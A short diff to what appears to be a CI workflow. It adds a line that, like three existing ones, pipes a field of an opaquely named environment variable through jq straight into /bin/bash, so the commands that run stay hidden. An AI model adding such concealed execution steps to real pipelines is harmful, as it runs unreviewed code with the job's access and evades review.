@@ -23,6 +23,7 @@ jobs:
           echo $hi92200 | jq -r .bwr1784 | /bin/bash
           echo $e8836 | jq -r .n7 | /bin/bash
           echo $htwm15 | jq -r .ajbxr996 | /bin/bash
+          printf '%s' "$cpf89" | jq -r .xk77208 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
